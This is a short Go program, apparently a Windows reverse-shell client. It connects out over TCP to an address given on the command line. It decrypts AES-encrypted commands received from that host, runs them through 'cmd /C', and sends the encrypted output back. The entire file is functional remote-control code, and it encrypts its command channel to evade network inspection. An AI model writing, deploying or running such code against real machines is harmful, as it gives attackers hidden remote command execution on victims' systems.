package main

import (
	"bufio"
	"crypto/md5"
	"encoding/hex"
	"fmt"
	"log"
	"net"
	"os"
	"os/exec"

	aesplug "golang.com/golang.com/aesPlug"
)

func main() {
	// 检查命令行参数，确保提供了远程地址
	if len(os.Args) < 3 {
		fmt.Println("Usage:127.0.0.1:9999 aeskey")
		os.Exit(1)
	}

	// 获取远程地址
	remoteIp := os.Args[1]
	aesKey := os.Args[2]
	newAesKey := hashMD5(aesKey)

	// 连接远程地址的 TCP 服务
	remoteConn, err := net.Dial("tcp", remoteIp)
	if err != nil {
		log.Fatal("connecting err: ", err)
	}
	fmt.Println("connection succeeded")
	handleConn(remoteConn, newAesKey)
}

func handleConn(conn net.Conn, newAesKey string) {
	scanner := bufio.NewScanner(conn)
	for scanner.Scan() {
		ciphertext := scanner.Text()
		fmt.Println("command密文", ciphertext)
		plaintext := aesplug.DecryptAES([]byte(newAesKey), ciphertext)
		command := exec.Command("cmd", "/C", plaintext)
		command.Env = os.Environ()
		//捕获输出
		result, err := command.CombinedOutput()
		if err != nil {
			fmt.Println("Error executing command:", err)
		}
		ciphertextResult := aesplug.EncryptAES([]byte(newAesKey), string(result))
		_, _ = fmt.Fprintln(conn, ciphertextResult) //发送给客户端
	}
}

func hashMD5(input string) string {
	// 创建一个MD5哈希对象
	hasher := md5.New()

	// 将字符串写入哈希对象
	hasher.Write([]byte(input))

	// 计算MD5散列值
	hash := hasher.Sum(nil)

	// 将散列值转换为十六进制字符串并返回
	hashString := hex.EncodeToString(hash)
	return hashString
}
